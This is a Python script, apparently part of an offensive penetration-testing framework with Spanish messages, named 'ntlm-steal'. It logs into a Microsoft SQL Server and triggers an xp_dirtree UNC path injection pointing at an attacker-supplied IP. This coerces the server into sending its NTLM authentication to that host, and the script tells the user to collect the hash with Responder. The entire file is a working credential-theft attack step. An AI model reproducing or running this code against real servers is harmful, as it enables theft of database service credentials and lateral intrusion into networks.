# scripts/mssql/attack/ntlm_steal.py
from scripts.base import BaseScript
from modules.mssql import MSSQLModule
from core.output import print_result, print_check

class Script(BaseScript):
    name        = "ntlm-steal"
    protocol    = "mssql"
    category    = "attack"
    description = "Fuerza auth NTLM del servidor hacia attacker_ip via xp_dirtree (UNC injection)."

    def run(self, **kwargs):
        attacker_ip = kwargs.get("attacker_ip", "")
        port        = int(kwargs.get("port") or 1433)
        if not attacker_ip:
            print_result("MSSQL", self.target.ip, "fail", "attacker_ip no especificado")
            return None
        mod = MSSQLModule(self.target, self.creds)
        if not mod.connect(port=port):
            return None
        if not mod.login():
            mod.disconnect(); return None
        try:
            ok = mod.ntlm_steal(attacker_ip)
            print_check("UNC -> \\\\" + attacker_ip + "\\lobera disparado. Espera el hash en Responder.", ok=True)
            return {"triggered": ok, "attacker_ip": attacker_ip}
        finally:
            mod.disconnect()
